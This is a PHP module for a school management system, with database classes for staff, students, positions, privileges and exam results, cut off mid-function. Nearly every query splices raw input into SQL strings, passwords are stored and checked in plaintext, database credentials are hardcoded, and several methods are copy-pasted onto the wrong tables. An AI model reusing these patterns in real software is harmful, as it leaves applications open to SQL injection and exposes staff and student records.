<?php error_reporting(error_reporting() & ~E_ALL);
set_time_limit(4800);
include 'dashboard/Module.php';
$UnredMessages=Message::ReadAllUnreadMessages($_SESSION['email']);
$Messages=Message::ReadAll($_SESSION['email']);
$NewMessages=Message::ReadAllUnreadMessages($_SESSION['email']);
$NewAlerts=Message::ReadAllUnreadAlerts($_SESSION['email']);

//security Module
//Module::Validate();


/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of Department
 *
 * @author MunsuleMPI
 

  if(Module::Validate())
  {
    echo "Expired";
  }
  else
  {
    echo "Active";
  }
*/

  
class dbass{
    protected static 
            $Name="gsdw_root",
            $Pass="gsdw_root",
            $Server="localhost",
            $dbass="aaa_db";
            
    public static $Message,
            $Status,
            $Errors;
    
    public static function Connect(){
       $con=mysqli_connect(dbass::$Server, dbass::$Name,dbass::$Pass,dbass::$dbass);
       if($con){
            dbass::$Status="Connected";
            dbass::$Message="dbass connection was successful";
        }
        else 
        {
            dbass::$Status="Disconnected";
            dbass::$Message="Database not Found. Ensure you install the Database from Control Panel and try again";
        }  

        return $con;
    }//dbass Connector Method


    public function Disconnect(){
        $con=mysql_connect(dbass::$Server, dbass::$Name,dbass::$Pass);
        mysql_close($con);
        dbass::$Status="Disconnected";
        dbass::$Message="Database connection was Closed Successfully";
    }//dbass Disconnector Method


    public function IsConnected(){
        $rs=dbass::$Status;
        return $rs;
    }//dbass Connection Status Check Method
}//dbass Class



/**
 * Positions Module for the integrating Institutions
 */
class Position extends dbass {
  public static function IsExist($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions where id='$id' or post='$id'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsPositionPrivilege($post,$privilege){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions where post='$post' and privileges like '%$privilege%'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddNew($post,$type,$description,$privileges){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into positions(post,type,description,privileges) values('$post','$type','$description','$privileges')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function Update($id, $post, $type, $description, $privileges){
    if(Position::IsExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE positions set post='$post', type='$type', description='$description', privileges='$privileges' where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from positions where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllPositions(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadAllPositionPosts(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['post'], $news)){
            array_push($news, $res['post']);
          }
      }
      
      return $news;
  }

  public static function ReadAllPositionTypes(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['type'], $news)){
            array_push($news, $res['type']);
          }
      }
      
      return $news;
  }

  public static function ReadDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['post']=$res['post'];
        $news['type']=$res['type'];
        $news['description']=$res['description'];
        $news['privileges']=$res['privileges'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }
}
//Positions Module Ended

/**
 * Sync Module for the integrating Institutions
 */
class Sync extends dbass {
  public static function Count_Table_Entry($table_name){
      $query=mysqli_query(dbass::Connect(),"SELECT * from ".$table_name);

      $res=mysqli_num_rows($query);

      return $res;
  }


  public static function IsScriptExist($script){
      $query=mysqli_query(dbass::Connect(),"SELECT * from sync_table where script='$script' ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  
  function LaunchExternalScript($url)
  {
     $options = array(
        CURLOPT_TIMEOUT   => 3,
        CURLOPT_NOSIGNAL  => true,
        CURLOPT_USERAGENT => "Launcher"
     );
     $ch = curl_init($url);
     curl_setopt_array($ch,$options);
     curl_exec($ch);
  }



  public static function IsOnline(){
    $connected=@fsockopen("www.google.com",80);
      if($connected>0)
      {
          $is_conn=True;
      }
      else
      {
        $is_conn=False;
      }
      
      return $is_conn;
  }

  public static function Add($date,$script){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into sync_table (`date`,script) values('$date','$script')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function Update($id, $post, $type, $description, $privileges){
    if(Position::IsExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE positions set post='$post', type='$type', description='$description', privileges='$privileges' where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from sync_presult where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllResultUpdates(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from sync_presult ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadAllPositionPosts(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['post'], $news)){
            array_push($news, $res['post']);
          }
      }
      
      return $news;
  }

  public static function ReadAllPositionTypes(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['type'], $news)){
            array_push($news, $res['type']);
          }
      }
      
      return $news;
  }

  public static function ReadDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['post']=$res['post'];
        $news['type']=$res['type'];
        $news['description']=$res['description'];
        $news['privileges']=$res['privileges'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }
}
//Sync Module Ended

/**
 * User Privilegess Module for the integrating Institutions
 */
class Privilege extends dbass {
  public static function IsExist($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from privileges where id='$id' or post='$id'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddNew($post,$type,$description){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into positions(post,type,description) values('$post','$type','$description')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function Update($id, $post, $type, $description){
    if(Position::IsExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE positions set post='$post', type='$type', description='$description' where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from positions where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllPositions(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadAllPositionPosts(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['post'], $news)){
            array_push($news, $res['post']);
          }
      }
      
      return $news;
  }

  public static function ReadAllPositionTypes(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['type'], $news)){
            array_push($news, $res['type']);
          }
      }
      
      return $news;
  }

  public static function ReadDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from positions where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['post']=$res['post'];
        $news['type']=$res['type'];
        $news['description']=$res['description'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }
}
//Positions Module Ended

class Module extends dbass {
    
  //Staff Modules
  /** This is to check whether User already exist*/

  public static function IsStaffIdExist($id){
      $query=mysqli_query(dbass::Connect(),"select * from staff where id='$id' ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsStaffExist($staffid){
      $query=mysqli_query(dbass::Connect(),"select * from staff where staff_id='$staffid' ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

    public static function GetClassLastStudent($session,$token){
      $session_s=explode("/", $session);

      $sessiontoken=$session_s[0]."/".$token;
      
        $query=mysqli_query(dbass::Connect(),"SELECT  max(reg_id)  from pstudents where  reg_no like '%$sessiontoken%' ");
        
        while($res=mysqli_fetch_array($query))
        {
           $news=$res[0];
        }
        
        return $news;
    }

  public static function IsStaff($staffid,$password){
      $query=mysqli_query(dbass::Connect(),"SELECT * from staff where staff_id='$staffid' and password='$password'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=true;
      }
      
      return $rs;
  }

  public static function IsStaffEmailExistNew($email){
      $query=mysqli_query(dbass::Connect(),"SELECT * from staff where email='$email'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=true;
      }
      
      return $rs;
  }

  public static function IsStaffEmailExistUpdate($staff_id,$email){
      $query=mysqli_query(dbass::Connect(),"SELECT * from staff where (staff_id='$staff_id' and email='$email')");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=true;
      }
      
      return $rs;
  }


  public static function AddNewStaff($staffid,$name,$sex,$user_type,$password,$post,$email,$phone,$status,$date_employed,$date_resigned,$sgl,$address){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into staff(staff_id,names,sex,user_type,password,post,email,phone,status,date_employed,date_resigned,sgl,address) values('$staffid','$name','$sex','$user_type','$password','$post','$email','$phone','$status','$date_employed','$date_resigned','$sgl','$address')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function AddStaff($staffid,$name,$password,$post,$email,$phone,$status){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into staff(staff_id,names,password,post,email,phone,status) values('$staffid','$name','$password','$post','$email','$phone','$status')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }


  public static function UpdateStaff($id,$staffid,$name,$sex,$user_type,$password,$post,$email,$phone,$status,$date_employed,$date_resigned,$sgl,$address){
    if(Module::IsStaffIdExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE staff set staff_id='$staffid', names='$name', sex='$sex', user_type='$user_type', password='$password', post='$post', email='$email' , phone='$phone' , status='$status' , date_employed='$date_employed', date_resigned='$date_resigned', sgl='$sgl', address='$address' where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }


  public static function UpdateStaffById($staffid,$name,$sex,$user_type,$password,$post,$email,$phone,$status,$date_employed,$date_resigned,$sgl,$address){
    if(Module::IsStaffExist($staffid))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE staff set staff_id='$staffid', names='$name', sex='$sex',user_type='$user_type', password='$password', post='$post', email='$email' , phone='$phone' , status='$status' , date_employed='$date_employed', date_resigned='$date_resigned', sgl='$sgl', address='$address' where staff_id='$staffid'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }


  public static function DeleteStaff($staffid){
      $query=mysqli_query(dbass::Connect(),"DELETE from staff where staff_id='$staffid'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function SearchStudents($src){
    $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where names like '%$src%' or  reg_no like '%$src%' or  class like '%$src%' or  session like '%$src%' or  date_admitted like '%$src%' order by names");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
        if(!in_array($res['reg_no'], $news)){
          array_push($news, $res['reg_no']);
        }
    }
    
    return $news;
  }

  public static function SearchStaffs($src){
    $query=mysqli_query(dbass::Connect(),"SELECT * from staff where names like '%$src%' or  staff_id like '%$src%' order by names");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
        if(!in_array($res['reg_no'], $news)){
          array_push($news, $res['reg_no']);
        }
    }
    
    return $news;
  }

  public static function SearchClassStudents($src,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where names like '%$src%' or  reg_no like '%$src%' or  class like '%$src%' or  session like '%$src%' or  date_admitted like '%$src%' order by names");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['reg_no'], $news)){
            array_push($news, $res['reg_no']);
          }
      }
      
      return $news;
  }

  public static function ReadAllStaff(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from staff ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['staff_id'], $news)){
            array_push($news, $res['staff_id']);
          }
      }
      
      return $news;
  }

  /*Read all the staff whether around or gone*/
  public static function ReadGeneralStaff(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from staff ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['staff_id'], $news)){
            array_push($news, $res['staff_id']);
          }
      }
      
      return $news;
  }


  public static function IsStaffp($staffid,$password){
      $query=mysqli_query(dbass::Connect(),"select * from staff where staff_id='$staffid' and password='$password'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }



  public static function SaveProfilePicture($staff_id,$passport)
  {
     $query=mysqli_query(dbass::Connect(),"UPDATE staff set passport='$passport' where staff_id='$staff_id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }



  public static function SaveStudentProfilePicturep($reg_no,$passport)
  {
     $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set passport='$passport' where reg_no='$reg_no' or id='$reg_no'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadStaffDetails($staff){
      $query=mysqli_query(dbass::Connect(),"SELECT * from staff where staff_id='$staff' or  id='$staff'");
      while($res=mysqli_fetch_array($query))
      {
        $news['staff_id']=$res['staff_id'];
        $news['names']=$res['names'];
        $news['id']=$res['id'];
        $news['password']=$res['password'];
        $news['post']=$res['post'];
        $news['phone']=$res['phone'];
        $news['email']=$res['email'];
        $news['status']=$res['status'];
        $news['user_type']=$res['user_type'];
        $news['sgl']=$res['sgl'];
        $news['date_employed']=$res['date_employed'];
        $news['date_resigned']=$res['date_resigned'];
        $news['address']=$res['address'];
        $news['sex']=$res['sex'];
        $news['user_type']=$res['user_type'];
        $news['passport']=$res['passport'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }

  public static function ReadStaffIdDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from staff where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['staff_id']=$res['staff_id'];
        $news['names']=$res['names'];
        $news['id']=$res['id'];
        $news['password']=$res['password'];
        $news['post']=$res['post'];
        $news['phone']=$res['phone'];
        $news['email']=$res['email'];
        $news['user_type']=$res['user_type'];
        $news['status']=$res['status'];
        $news['sex']=$res['sex'];
        $news['sgl']=$res['sgl'];
        $news['date_employed']=$res['date_employed'];
        $news['date_resigned']=$res['date_resigned'];
        $news['address']=$res['address'];
        $news['passport']=$res['passport'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }

  public static function ReadStaffAllocationSubjectsByClass($staff,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where staff_id='$staff' and session='$session' and term='$term' and class='$class'  order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['subject'], $news)){
            array_push($news, $res['subject']);
        }
      }
      
      return $news;
  }

  public static function ReadLevelSubjects($level){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subjects where level='$level'   ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['subject'], $news)){
            array_push($news,$res['subject']);
        }
      }
      
      return $news;
  }

  public static function ReadClassSubjectsp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where class='$class' order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(Module::IsSubjectExistp($res['subject']))
        {
          if(!in_array($res['subject'], $news)){
              array_push($news,$res['subject']);
          }
        }
      }
      
      return $news;
  }

  public static function ReadClassResultSubjectsp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(Module::IsSubjectExistp($res['subject']))
        {
          if(!in_array($res['subject'], $news)){
              array_push($news,$res['subject']);
          }
        }
      }
      
      return $news;
  }

  public static function ReadClassSessionSubjectsp($class,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where class='$class' and session='$session' order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['subject'], $news)){
            array_push($news,$res['subject']);
        }
      }
      
      return $news;
  }



  public static function ReadStaffAllocationClasses($staff,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where staff_id='$staff' and session='$session' and term='$term' order by class ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['class'], $news)){
            array_push($news, $res['class']);
          }
      }
      
      return $news;
  }

  public static function ReadAllClasses(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from students where order by class ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!($res['class']=='null')||!($res['class']==''))
        {
          if(!in_array($res['class'], $news)){
            array_push($news, $res['class']);
          }
        }
          
      }
      
      return $news;
  }

  public static function ReadAllClassesp(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from classes order by class ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!($res['class']=='null')&&!($res['class']==''))
        {
          if(!in_array($res['class'], $news)){
            array_push($news, $res['class']);
          }
        }
          
      }
      
      return $news;
  }

  public static function ReadStaffAllocationClassesp($staff,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where staff_id='$staff' and session='$session' and term='$term' order by class ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['class'], $news)){
            array_push($news, $res['class']);
          }
      }
      sort($news);
      
      return $news;
  }

  public static function ReadStaffAllocationSubjectp($staff,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where staff_id='$staff' and session='$session' and term='$term' order by class ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['class'], $news)){
            array_push($news, $res['class']);
          }
      }
      sort($news);
      
      return $news;
  }




    public static function SavePrincipalRemark($student,$session,$term,$remark,$total){
      if(Module::IsStudentInAnalysis($student,$session,$term))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE result_analysis set principal_remark='$remark', total='$total' where reg_no='$student' and session='$session' and term='$term' ");
        if($query)
          $news="Principal Remark Changed Successfully";
        else
          $news="Principal Remark Not Changed Successfully";
      }
      else
      {
        $query=mysqli_query(dbass::Connect(),"INSERT into result_analysis(reg_no,session,term,principal_remark,total) values('$student','$session','$term','$remark','$total')");
        if($query)
          $news="Principal Remark Inserted Successfully";
        else
          $news="Principal Remark Not Inserted Successfully";
      }

        
        
        return $news;
    }

    public static function SaveFMRemark($student,$session,$term,$remark,$totalscore){
      if(Module::IsStudentInAnalysis($student,$session,$term))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE result_analysis set form_master_remark='$remark',total='$totalscore' where reg_no='$student' and session='$session' and term='$term' ");
        if($query)
          $news="Form Master's Remark Changed Successfully";
        else
          $news="Form Master's Remark Not Changed Successfully";
      }
      else
      {
        $query=mysqli_query(dbass::Connect(),"INSERT into result_analysis(reg_no,session,term,form_master_remark,total) values('$student','$session','$term','$remark','$totalscore')");
        if($query)
          $news="Form Master's Remark Inserted Successfully";
        else
          $news="Form Master's Remark Not Inserted Successfully";
      }

      return $news;
    }


    public static function SaveTeacherRemark($student,$subject,$session,$term,$remark){
      if(Module::IsStudentScoreExist($student,$subject,$session,$term))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE result set teacher_remark='$remark' where reg_no='$student' and session='$session' and term='$term' and subject='$subject' ");
        if($query)
          $news="Remark Modified Successfully";
        else
          $news="Remark not Modified Successfully";
      }
      else
      {
        $news="The Student have no result for the select term. Enter Scores and Try again";
      }
      return $news;
    }

    //Staff Modules Ends

    //Student Module Starts
    public static function IsStudentExist($regno){
        $query=mysqli_query(dbass::Connect(),"select * from pstudents where reg_no='$regno'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }
    public static function IsStudentIdExist($id){
        $query=mysqli_query(dbass::Connect(),"select * from students where id='$id'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsStudentp($regno,$password){
        $query=mysqli_query(dbass::Connect(),"select * from pstudents where reg_no='$regno' and password='$password'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsParentp($phone,$email){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where g_phone='$phone'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsStudentExistp($regno){
        $query=mysqli_query(dbass::Connect(),"select * from pstudents where reg_no='$regno'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsStudentRegNoSamep($id,$regno){
        $query=mysqli_query(dbass::Connect(),"select * from pstudents where id='$id'");

        while($res=mysqli_fetch_array($query))
        {
          $rs=$res['reg_no'];
        }
          echo $regno.' '.$rs;

        if($regno!=$rs)
        {
          $bool['status']=true;
          $bool['oregno']=$rs;
        }
        
        return $bool;
    }

    public static function IsStudentIdExistp($id){
        $query=mysqli_query(dbass::Connect(),"select * from pstudents where id='$id'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function DeleteStudent($regno){
        $query=mysqli_query(dbass::Connect(),"DELETE from students where reg_no='$regno'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function DeleteStudentp($regno){
        $query=mysqli_query(dbass::Connect(),"DELETE from pstudents where reg_no='$regno'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function ClearSubjectResultp($subject,$class,$term,$session){
        $query=mysqli_query(dbass::Connect(),"DELETE from presult where subject='$subject' and class='$class' and term='$term' and session='$session'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function DeleteIdStudentp($id){
        $query=mysqli_query(dbass::Connect(),"DELETE from pstudents where id='$id'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function AddStudent($regid,$regn,$names,$class,$dateadmitted,$session,$password){
      $ree=explode("/", $session);
      $year=$ree[0];
      $classtoken=substr($class, strlen($class)-1);
      if(($classtoken=="1") || ($classtoken=="2") || ($classtoken=="3"))
      {
        $classtoken="";
      }
      elseif($classtoken=="0")
      {
        $classtoken=$classtoken;
      }
      else
      {
        $classtoken=$classtoken;
      }
      $regno="$year"."$classtoken$regn";
      if(!(Module::IsStudentExist($regno)))
      {        
        $query=mysqli_query(dbass::Connect(),"INSERT into students(reg_id,reg_no,names,class,date_admitted,session,password) values('$regid','$regno','$names','JSS 1','$dateadmitted','$session','$password')");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }        
      }

      return $news;
    }

    public static function AddStudentp($regid,$regn,$statuss,$names,$date_of_birth,$lga,$state,$country,$class,$dateadmitted,$session,$password,$date_graduated,$g_email,$g_phone,$address,$guardian){
      $ree=explode("/", $session);
      $year=$ree[0];
      $classtoken=substr($class, strlen($class)-1);

      //echo School::ReadSchoolDetails()['school_keycode'];

      if(!(($classtoken=="A") || ($classtoken=="B") || ($classtoken=="C") || ($classtoken=="D") || ($classtoken=="E") || ($classtoken=="F") || ($classtoken=="G") || ($classtoken=="H") || ($classtoken=="I") || ($classtoken=="J") || ($classtoken=="K") || ($classtoken=="L") || ($classtoken=="M") || ($classtoken=="N") || ($classtoken=="O") || ($classtoken=="P") || ($classtoken=="Q") || ($classtoken=="R") || ($classtoken=="S") || ($classtoken=="T") || ($classtoken=="U") || ($classtoken=="V") || ($classtoken=="W") || ($classtoken=="X") || ($classtoken=="Y") || ($classtoken=="Z")))
      {
        $regno=School::ReadSchoolDetails()['school_keycode']."/$year"."/$regn";
      }
      else
      {
        $regno=School::ReadSchoolDetails()['school_keycode']."/$year/".$classtoken."/$regn";
      }
      if(!(Module::IsStudentExistp($regno)))
      {    
        $query=mysqli_query(dbass::Connect(),"INSERT into pstudents(reg_no,status,names,date_of_birth,lga,state,country,class,date_admitted,session,password,reg_id,date_graduated,g_email,g_phone,address,guardian) values('$regno','$statuss','$names','$date_of_birth','$lga','$state','$country','$class','$dateadmitted','$session','$password','$regid','$date_graduated','$g_email','$g_phone','$address','$guardian')");
        if($query){
          $news=true;
          Activity::Add($_SESSION['userid'],"Management","Add Student"," $regno $names $class $date_admitted $session Registered",$session,$term);
        }
        else{
          $news=false;
        }
      }

      return $news;
    }

    public static function GetLastStudent($session){
        $query=mysqli_query(dbass::Connect(),"SELECT  max(reg_id)  from pstudents where session='$session' ");
        
        while($res=mysqli_fetch_array($query))
        {
           $news=$res[0];
        }
        
        return $news;
    }
    
    public static function AddBackupStudentp($regid,$regno,$names,$class,$dateadmitted,$session,$password,$date_graduated,$g_email,$g_phone,$address,$guardian){
     
      if(!(Module::IsStudentExistp($regno)))
      {    
        $query=mysqli_query(dbass::Connect(),"INSERT into pstudents(reg_no,names,class,date_admitted,session,password,reg_id,date_graduated,g_email,g_phone,address,guardian) values('$regno','$names','$class','$dateadmitted','$session','$password','$regid','$date_graduated','$g_email','$g_phone','$address','$guardian')");
        if($query){
          $news=true;
          Activity::Add($_SESSION['userid'],"Management","Add Student"," $regno $names $class $date_admitted $session Registered or Admitted",$session,$term);
        }
        else{
          $news=false;
        }
      }
      else
      {
        echo "Student Exist";
      }

      return $news;
    }

    public static function GetSessionStudentScorep($reg_no,$subject,$session)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where subject='$subject' and session='$session' and reg_no='$reg_no' ");
      if($res=mysqli_fetch_array($query))
      {
        return $res[0];
      }
    }

    public static function GetSessionStudentCa1Scorep($reg_no,$subject,$session)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_1) from presult where subject='$subject' and session='$session' and reg_no='$reg_no' ");
      if($res=mysqli_fetch_array($query))
      {
        return $res[0];
      }
    }

    public static function GetSessionStudentCa2Scorep($reg_no,$subject,$session)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_2) from presult where subject='$subject' and session='$session' and reg_no='$reg_no' ");
      if($res=mysqli_fetch_array($query))
      {
        return $res[0];
      }
    }

    public static function GetSessionStudentCa3Scorep($reg_no,$subject,$session)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_3) from presult where subject='$subject' and session='$session' and reg_no='$reg_no' ");
      if($res=mysqli_fetch_array($query))
      {
        return $res[0];
      }
    }

    public static function GetSessionStudentExamScorep($reg_no,$subject,$session)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT sum(exam) from presult where subject='$subject' and session='$session' and reg_no='$reg_no' ");
      if($res=mysqli_fetch_array($query))
      {
        return $res[0];
      }
    }

    public static function GetSessionStudentTotalScorep($reg_no,$subject,$session)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where subject='$subject' and session='$session' and reg_no='$reg_no' ");
      if($res=mysqli_fetch_array($query))
      {
        return $res[0];
      }
    }

    public static function GetSessionScorep($class,$subject,$session)
    {
      $scores=array();
      $Students=Module::ReadClassStudentsp($class);
      if(count($Students)>0)
      {
        foreach($Students as $Student)
        {
          $score=Module::GetSessionStudentScorep($Student,$subject,$session);
          if(!(in_array($score, $scores))){
            array_push($scores, $score);
          }
        }
      }
      return $scores;
    }

    public static function UpdateStudent($id,$regid,$regno,$names,$class,$dateadmitted,$session,$password){
      if(Module::IsStudentIdExist($id))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE students set reg_no='$regno',reg_id='$regid', names='$names', class='$class', date_admitted='$dateadmitted', session='$session' , password='$password' where id='$id'");
        if($query)
          $news=true;
        else
          $news=false;
      }
      else
      {
        $news=false;
      }

        return $news;
    }

    public static function UpdateStudentp($id,$regid,$regno,$statuss,$names,$date_of_birth,$lga,$state,$country,$class,$dateadmitted,$session,$password,$guardian,$g_email,$g_phone,$date_graduated,$address){
      if(Module::IsStudentIdExistp($id))
      {
        $status=Module::IsStudentRegNoSamep($id,$regno);

        
        if($status['status']==true)
        {
          $nregno=$regno;
          $oregno=$status['oregno'];

          $query1=mysqli_query(dbass::Connect(),"UPDATE presult set reg_no='$nregno' where reg_no='$oregno'");
          if($query1){
